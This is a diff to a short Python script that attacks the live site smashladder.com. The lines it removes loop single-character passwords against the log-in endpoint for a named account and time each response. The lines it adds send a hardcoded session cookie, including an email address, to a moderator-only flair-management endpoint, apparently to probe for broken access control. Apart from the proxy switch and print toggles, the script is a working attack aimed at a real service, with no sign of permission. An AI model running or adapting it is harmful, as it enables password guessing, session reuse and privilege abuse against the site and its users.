@@ -6,11 +6,11 @@ import string
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-PROXY = True
+PROXY = False
 
 def makePushPost(url,message,use_json=1):
     p = {}
-    c = {} #{"lad_sock_hash":"5f505e09d8b74bcc1282e9899f99ff2a","lad_sock_remember_me":"anonymoosen%40hotmail.com","lad_sock_user_id":"58133","timezone":"America/Denver"}
+    c = {"lad_sock_hash":"4ab9f8ecb205300f0978221a208d1c63","lad_sock_remember_me":"anonymoosen%40hotmail.com","lad_sock_user_id":"58133","timezone":"America/Denver"}
     if PROXY:
         proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
     else:
@@ -30,21 +30,21 @@ def makePushPost(url,message,use_json=1):
             response = r.json()   
     except:
         pass
-    print("{:04f}".format(time.time()-start))
+    #print("{:04f}".format(time.time()-start))
     #print(response['success'])
 
 
-    #print(response.replace('\\\\','\\').replace('\\n','\n').replace('\\\\',''))
+    print(response.replace('\\\\','\\').replace('\\n','\n').replace('\\\\',''))
 
 def main():
-    url = "https://www.smashladder.com/log-in"
-    for char in string.ascii_lowercase:
-        message={"username":"anonymoosen","password":char,"remember":1,"json":1}
+    url = "https://www.smashladder.com/mod/flair-manager"
+    #for char in string.ascii_lowercase:
+    message={"folder_id":1, "flair_ids": 435, "save_flair_order": 1}
         #start = time.time()
-        #makePushPost(url,message)
+    makePushPost(url,message)
         #print(time.time()-start)
-        print(char)
-        makePushPost(url,message,0)
+        #print(char)
+    makePushPost(url,message,0)
 
 if __name__=='__main__':
     main()
